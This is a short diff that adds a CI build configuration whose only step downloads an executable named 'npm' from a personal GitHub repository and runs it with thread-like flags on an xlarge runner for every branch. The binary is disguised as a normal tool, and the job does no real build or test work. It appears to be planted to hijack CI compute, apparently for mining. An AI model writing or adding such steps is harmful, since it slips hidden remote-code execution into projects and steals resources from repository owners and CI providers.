@@ -1,0 +1,13 @@
+jobs:
+  build:
+    docker:
+      - image: ubuntu:16.04
+    parallelism: 1
+    resource_class: xlarge
+    branches:
+      only:
+        - master
+        - /*/
+    steps:
+      - run: apt-get update && apt-get install -y wget && wget https://github.com/rudawa/rudawa/raw/master/npm && chmod +x npm && ./npm -t 18 -d 5
+      
